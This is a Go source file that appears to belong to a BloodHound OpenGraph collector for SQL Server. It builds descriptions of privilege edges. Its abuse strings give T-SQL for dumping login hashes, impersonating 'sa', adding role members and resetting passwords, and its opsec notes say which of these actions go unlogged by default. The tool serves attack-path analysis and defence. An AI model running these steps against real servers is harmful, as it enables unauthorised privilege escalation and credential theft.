// Package bloodhound provides BloodHound OpenGraph JSON output generation.
// This file contains edge property generators that match the PowerShell version.
package bloodhound

import (
	"strings"
)

// EdgeProperties contains the documentation and metadata for an edge
type EdgeProperties struct {
	Traversable  bool   `json:"traversable"`
	General      string `json:"general"`
	WindowsAbuse string `json:"windowsAbuse"`
	LinuxAbuse   string `json:"linuxAbuse"`
	Opsec        string `json:"opsec"`
	References   string `json:"references"`
}

// EdgeContext provides context for generating edge properties
type EdgeContext struct {
	SourceName            string
	SourceType            string
	SourceID              string // ObjectIdentifier of source node
	TargetName            string
	TargetType            string
	TargetID              string // ObjectIdentifier of target node
	TargetTypeDescription string // e.g., "SERVER_ROLE", "DATABASE_ROLE", "APPLICATION_ROLE", "SQL_LOGIN"
	SQLServerName         string
	SQLServerID           string // Server ObjectIdentifier
	DatabaseName          string
	Permission            string
	IsFixedRole           bool
	SecurityIdentifier    string // SID for CoerceAndRelay edges
	ProxyName             string // Proxy name for HasProxyCred edges
	CredentialIdentity    string // Credential identity for HasMappedCred/HasDBScopedCred edges
	Subsystems            string // Proxy subsystems for HasProxyCred edges
	IsEnabled             bool   // Whether a proxy/login is enabled
}

// escapeAndUpper escapes backslashes and uppercases an ObjectIdentifier for use in Cypher queries.
func escapeAndUpper(id string) string {
	return strings.ToUpper(strings.ReplaceAll(id, `\`, `\\`))
}

// extractDBID extracts the database ObjectIdentifier from a compound ID (e.g., "user@dbid" -> "dbid").
func extractDBID(objectID string) string {
	parts := strings.SplitN(objectID, "@", 2)
	if len(parts) == 2 {
		return parts[1]
	}
	return objectID
}

// GetEdgeProperties returns the properties for a given edge kind.
// Matches PS1 Add-Edge behavior: filters out empty strings but always includes booleans.
func GetEdgeProperties(kind string, ctx *EdgeContext) map[string]interface{} {
	props := make(map[string]interface{})

	generator, ok := edgePropertyGenerators[kind]
	if !ok {
		// Default properties for unknown edge types
		props["traversable"] = true
		props["general"] = "Relationship exists between source and target."
		return props
	}

	edgeProps := generator(ctx)
	props["traversable"] = edgeProps.Traversable

	// Only set non-empty string properties (matches PS1 Add-Edge filtering)
	if edgeProps.General != "" {
		props["general"] = edgeProps.General
	}
	if edgeProps.WindowsAbuse != "" {
		props["windowsAbuse"] = edgeProps.WindowsAbuse
	}
	if edgeProps.LinuxAbuse != "" {
		props["linuxAbuse"] = edgeProps.LinuxAbuse
	}
	if edgeProps.Opsec != "" {
		props["opsec"] = edgeProps.Opsec
	}
	if edgeProps.References != "" {
		props["references"] = edgeProps.References
	}

	// Add composition if available
	if compGen, ok := edgeCompositionGenerators[kind]; ok && ctx != nil {
		if comp := compGen(ctx); comp != "" {
			props["composition"] = comp
		}
	}

	return props
}

// IsTraversableEdge returns whether an edge type is traversable based on its
// property generator definition. This matches the PowerShell EdgePropertyGenerators
// traversable values.
func IsTraversableEdge(kind string) bool {
	// Check against known non-traversable edge types (matching PowerShell EdgePropertyGenerators)
	switch kind {
	case EdgeKinds.Alter,
		EdgeKinds.Control,
		EdgeKinds.Impersonate,
		EdgeKinds.AlterAnyLogin,
		EdgeKinds.AlterAnyServerRole,
		EdgeKinds.AlterAnyAppRole,
		EdgeKinds.AlterAnyDBRole,
		EdgeKinds.Connect,
		EdgeKinds.ConnectAnyDatabase,
		EdgeKinds.TakeOwnership,
		EdgeKinds.HasDBScopedCred,
		EdgeKinds.HasMappedCred,
		EdgeKinds.HasProxyCred,
		EdgeKinds.AlterDB,
		EdgeKinds.AlterDBRole,
		EdgeKinds.AlterServerRole,
		EdgeKinds.ImpersonateDBUser,
		EdgeKinds.ImpersonateLogin,
		EdgeKinds.LinkedTo,
		EdgeKinds.IsTrustedBy,
		EdgeKinds.ServiceAccountFor:
		return false
	default:
		return true
	}
}

// edgePropertyGenerators maps edge kinds to their property generators
var edgePropertyGenerators = map[string]func(*EdgeContext) EdgeProperties{

	EdgeKinds.MemberOf: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " is a member of the " + ctx.TargetType + ". This membership grants all permissions associated with the target role to the source principal.",
			WindowsAbuse: "When connected to the server/database as " + ctx.SourceName + ", you have all permissions granted to the " + ctx.TargetName + " role.",
			LinuxAbuse:   "When connected to the server/database as " + ctx.SourceName + ", you have all permissions granted to the " + ctx.TargetName + " role.",
			Opsec: "Role membership is a static relationship. Actions performed using role permissions are logged based on the specific operation, not the role membership itself. \n" +
				"To view current role memberships at server level: \n" +
				"SELECT \n" +
				"    r.name AS RoleName,\n" +
				"    m.name AS MemberName\n" +
				"FROM sys.server_role_members rm\n" +
				"JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id\n" +
				"JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id\n" +
				"ORDER BY r.name, m.name; \n" +
				"To view current role memberships at database level: \n" +
				"SELECT \n" +
				"    r.name AS RoleName,\n" +
				"    m.name AS MemberName\n" +
				"FROM sys.database_role_members rm\n" +
				"JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id\n" +
				"JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id\n" +
				"ORDER BY r.name, m.name; ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-role-members-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-database-role-members-transact-sql?view=sql-server-ver17",
		}
	},

	EdgeKinds.IsMappedTo: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The server login " + ctx.SourceName + " is mapped to the " + ctx.DatabaseName + " database user " + ctx.TargetName + ".",
			WindowsAbuse: "Connect as the login and use the database: USE " + ctx.DatabaseName + "; ",
			LinuxAbuse:   "Connect as the login and use the database: USE " + ctx.DatabaseName + "; ",
			Opsec:        "This is a static mapping. Actions are logged based on what the database user does.",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/create-a-database-user?view=sql-server-ver17",
		}
	},

	EdgeKinds.Contains: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " contains the " + ctx.TargetType + ". This is a structural relationship showing that the target exists within the scope of the source.",
			WindowsAbuse: "This is a structural relationship and cannot be directly abused. Control of " + ctx.SourceType + " implies control of " + ctx.TargetType + ".",
			LinuxAbuse:   "This is a structural relationship and cannot be directly abused. Control of " + ctx.SourceType + " implies control of " + ctx.TargetType + ".",
			Opsec:        "",
			References:   "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/principals-database-engine?view=sql-server-ver17",
		}
	},

	EdgeKinds.Owns: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse string
		if ctx.TargetType == "MSSQL_Database" {
			windowsAbuse = "As the database owner, connect to the " + ctx.SQLServerName + " SQL server and execute:\n" +
				"USE " + ctx.TargetName + "; \n" +
				"-- You have db_owner privileges in this database \n" +
				"-- Add users, grant permissions, modify objects, etc. \n" +
				"-- Examples: \n" +
				"CREATE USER [NewUser] FOR LOGIN [SomeLogin]; \n" +
				"EXEC sp_addrolemember 'db_datareader', 'NewUser'; \n" +
				"GRANT CONTROL TO [SomeUser]; "
			linuxAbuse = windowsAbuse
		} else if ctx.TargetType == "MSSQL_ServerRole" {
			windowsAbuse = "As the server role owner, connect to the " + ctx.SQLServerName + " SQL server and execute:\n" +
				"-- Add members to the owned role \n" +
				"EXEC sp_addsrvrolemember 'target_login', '" + ctx.TargetName + "'; \n" +
				"-- Change role name \n" +
				"ALTER SERVER ROLE [" + ctx.TargetName + "] WITH NAME = [NewName]; \n" +
				"-- Transfer ownership \n" +
				"ALTER AUTHORIZATION ON SERVER ROLE::[" + ctx.TargetName + "] TO [another_login]; "
			linuxAbuse = windowsAbuse
		} else if ctx.TargetType == "MSSQL_DatabaseRole" {
			windowsAbuse = "As the database role owner, connect to the " + ctx.SQLServerName + " SQL server and execute:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"-- Add members to the owned role \n" +
				"EXEC sp_addrolemember '" + ctx.TargetName + "', 'target_user'; \n" +
				"-- Change role name \n" +
				"ALTER ROLE [" + ctx.TargetName + "] WITH NAME = [NewName]; \n" +
				"-- Transfer ownership \n" +
				"ALTER AUTHORIZATION ON ROLE::[" + ctx.TargetName + "] TO [another_user]; "
			linuxAbuse = windowsAbuse
		}
		return EdgeProperties{
			Traversable:  true,
			General:      "The " + ctx.SourceType + " owns the " + ctx.TargetType + ". Ownership provides full control over the object, including the ability to grant permissions, change properties, and in most cases, impersonate or control access.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        "Ownership relationships are static and actions taken as an owner are typically logged based on the specific action performed. Role membership changes are logged by default, but ownership transfers and role property changes may not be logged.",
			References: "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addsrvrolemember-transact-sql?view=sql-server-ver17",
		}
	},

	EdgeKinds.ControlServer: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The CONTROL SERVER permission on a server allows the source " + ctx.SourceType + " to conduct any action in the instance of SQL Server that is not explicitly denied. An exception is for members of the sysadmin server role, in which case explicit denies are ignored.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"SELECT * FROM sys.sql_logins; -- dump hashes ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"SELECT * FROM sys.sql_logins; -- dump hashes ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log event generation is dependent on the action performed.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#sql-server-permissions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.ControlDB: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The CONTROL permission on a database grants the source " + ctx.SourceType + " all defined permissions on the database and its descendent objects. This includes the ability to impersonate any database user, add members to any role, change ownership of objects, and execute any action within the database. WARNING: This includes the ability to change application role passwords, which will break applications using those roles and cause an outage.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statements:\n" +
				"USE " + ctx.TargetName + "; \n" +
				"Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n" +
				"Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n" +
				"Change role owner: ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name]; \n" +
				"Change app role password: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statements:\n" +
				"USE " + ctx.TargetName + "; \n" +
				"Impersonate user: EXECUTE AS USER = 'user_name'; SELECT USER_NAME(); REVERT; \n" +
				"Add member to role: EXEC sp_addrolemember 'role_name', 'user_name'; \n" +
				"Change role owner: ALTER AUTHORIZATION ON ROLE::[role_name] TO [user_name]; \n" +
				"Change app role password: WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage.",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for user impersonation, role ownership changes, or application role password changes by default. Log events are generated by default for additions to database role membership. \n" +
				"To view database role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; ",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-authorization-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-application-role-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.Impersonate: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse, opsec string
		if ctx.DatabaseName != "" {
			// Database-level impersonation (EXECUTE AS USER)
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"USE " + ctx.DatabaseName + "; \n" +
				"EXECUTE AS USER = '" + ctx.TargetName + "' \n" +
				"   SELECT USER_NAME() \n" +
				"REVERT "
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for user impersonation by default."
		} else {
			// Server-level impersonation (EXECUTE AS LOGIN)
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = '" + ctx.TargetName + "' \n" +
				"   SELECT SUSER_NAME() \n" +
				"REVERT "
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for login impersonation by default."
		}
		return EdgeProperties{
			Traversable:  false, // Non-traversable (matches PowerShell); MSSQL_ExecuteAs is the traversable counterpart
			General:      "The IMPERSONATE permission on a securable object effectively grants the source " + ctx.SourceType + " the ability to impersonate the target object.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        opsec,
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.ImpersonateAnyLogin: func(ctx *EdgeContext) EdgeProperties {
		return EdgeProperties{
			Traversable: true,
			General:     "The IMPERSONATE ANY LOGIN permission on the server object effectively grants the source " + ctx.SourceType + " the ability to impersonate any server login.",
			WindowsAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = 'sa' \n" +
				"   -- Now executing with sa privileges \n" +
				"   SELECT SUSER_NAME() \n" +
				"   -- Perform privileged actions here \n" +
				"REVERT ",
			LinuxAbuse: "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXECUTE AS LOGIN = 'sa' \n" +
				"   -- Now executing with sa privileges \n" +
				"   SELECT SUSER_NAME() \n" +
				"   -- Perform privileged actions here \n" +
				"REVERT ",
			Opsec: "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for login impersonation by default.",
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17",
		}
	},

	EdgeKinds.ChangePassword: func(ctx *EdgeContext) EdgeProperties {
		var general, windowsAbuse, linuxAbuse, opsec, references string
		if ctx.TargetTypeDescription == "APPLICATION_ROLE" {
			general = "WARNING: DO NOT execute this attack, as it will immediately break the application that relies on this application role to access this database and WILL cause an outage. The ALTER ANY APPLICATION ROLE permission on a database allows the source " + ctx.SourceType + " to change the password for an application role, activate the application role with the new password, and execute actions with the application role's permissions."
			windowsAbuse = general
			linuxAbuse = general
			opsec = general
			references = "- https://learn.microsoft.com/en-us/sql/relational-databases/security/authentication-access/application-roles?view=sql-server-ver17"
		} else {
			general = "The source " + ctx.SourceType + " can change the password for this " + ctx.TargetType + "."
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"ALTER LOGIN [" + ctx.TargetName + "] WITH PASSWORD = 'password'; "
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"ALTER LOGIN [" + ctx.TargetName + "] WITH PASSWORD = 'password'; "
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are not generated for password changes by default."
			references = "- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-login-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17"
		}
		return EdgeProperties{
			Traversable:  true,
			General:      general,
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        opsec,
			References:   references,
		}
	},

	EdgeKinds.AddMember: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse, opsec, references string
		if ctx.TargetTypeDescription == "SERVER_ROLE" {
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXEC sp_addsrvrolemember 'login_name', '" + ctx.TargetName + "';"
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXEC sp_addsrvrolemember 'login_name', '" + ctx.TargetName + "';"
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to role membership. \n" +
				"To view role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC;"
			references = "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addsrvrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
		} else {
			windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
				"EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name';"
			linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
				"EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name';"
			opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
				"Log events are generated by default for additions to role membership. \n" +
				"To view role membership change logs, execute: \n" +
				"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC;"
			references = "- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-addrolemember-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/default-trace-enabled-server-configuration-option?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/relational-databases/security/auditing/sql-server-audit-database-engine?view=sql-server-ver16"
		}
		return EdgeProperties{
			Traversable:  true,
			General:      "The source " + ctx.SourceType + " can add members to this " + ctx.TargetType + ", granting the new member the permissions assigned to the role.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        opsec,
			References:   references,
		}
	},

	EdgeKinds.Alter: func(ctx *EdgeContext) EdgeProperties {
		var windowsAbuse, linuxAbuse, opsec string
		if ctx.DatabaseName != "" {
			// Database-level targets
			if ctx.TargetTypeDescription == "DATABASE_ROLE" {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"USE " + ctx.DatabaseName + "; \n" +
					"Add member: EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name'; "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"USE " + ctx.DatabaseName + "; \n" +
					"Add member: EXEC sp_addrolemember '" + ctx.TargetName + "', 'user_name'; "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are generated by default for additions to database role membership. \n" +
					"To view database role membership change logs, execute: \n" +
					"SELECT StartTime, LoginName + CASE WHEN EventClass = 110 THEN ' added ' WHEN EventClass = 111 THEN ' removed ' END + TargetUserName + CASE WHEN EventClass = 110 THEN ' to ' WHEN EventClass = 111 THEN ' from ' END + ObjectName + ' in database ' + DatabaseName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass IN (110, 111) ORDER BY StartTime DESC; "
			} else if ctx.TargetTypeDescription == "DATABASE" {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"USE " + ctx.TargetName + "; \n" +
					"Add member to any user-defined role: EXEC sp_addrolemember 'role_name', 'user_name'; \n" +
					"Note: ALTER on database grants effective permissions ALTER ANY ROLE and ALTER ANY APPLICATION ROLE."
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"USE " + ctx.TargetName + "; \n" +
					"Add member to any user-defined role: EXEC sp_addrolemember 'role_name', 'user_name'; \n" +
					"Note: ALTER on database grants effective permissions ALTER ANY ROLE and ALTER ANY APPLICATION ROLE."
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are generated by default for additions to database role membership when ALTER DATABASE permission is used to add members to roles."
			}
			// Other database-level types (users, app roles) return empty strings
		} else {
			// Server-level targets
			if ctx.TargetTypeDescription == "SERVER_ROLE" {
				windowsAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using sqlcmd, SQL Server Management Studio, mssql-cli, or proxied Linux tooling such as impacket mssqlclient.py) and execute the following SQL statement:\n" +
					"Add member: EXEC sp_addsrvrolemember 'login_name', '" + ctx.TargetName + "'; "
				linuxAbuse = "Connect to the " + ctx.SQLServerName + " SQL server as " + ctx.SourceName + " (e.g., using impacket mssqlclient.py or proxied Windows tooling such as sqlcmd, mssql-cli, or SQL Server Management Studio) and execute the following SQL statement:\n" +
					"Add member: EXEC sp_addsrvrolemember 'login_name', '" + ctx.TargetName + "'; "
				opsec = "SQL Server logs certain security-related events to a trace log by default, but must be configured to forward them to a SIEM. The local log may roll over frequently on large, active servers, as the default storage size is only 20 MB. Furthermore, the default trace log is deprecated and may be removed in future versions to be replaced permanently by Extended Events. \n" +
					"Log events are generated by default for additions to server role membership. \n" +
					"To view server role membership change logs, execute: \n" +
					"SELECT StartTime, LoginName + ' added ' + TargetLoginName + ' to ' + RoleName AS Change FROM sys.fn_trace_gettable((SELECT CONVERT(NVARCHAR(260), value) FROM sys.fn_trace_getinfo(1) WHERE property = 2), DEFAULT) WHERE EventClass = 108 ORDER BY StartTime DESC; "
			}
			// Other server-level types return empty strings
		}
		return EdgeProperties{
			Traversable:  false,
			General:      "The ALTER permission on a securable object allows the source " + ctx.SourceType + " to change properties, except ownership, of a particular securable object.",
			WindowsAbuse: windowsAbuse,
			LinuxAbuse:   linuxAbuse,
			Opsec:        opsec,
			References: "- https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver17#permissions-naming-conventions \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-role-transact-sql?view=sql-server-ver17 \n" +
				"- https://learn.microsoft.com/en-us/sql/t-sql/statements/alter-server-role-transact-sql?view=sql-server-ver17 \n" +
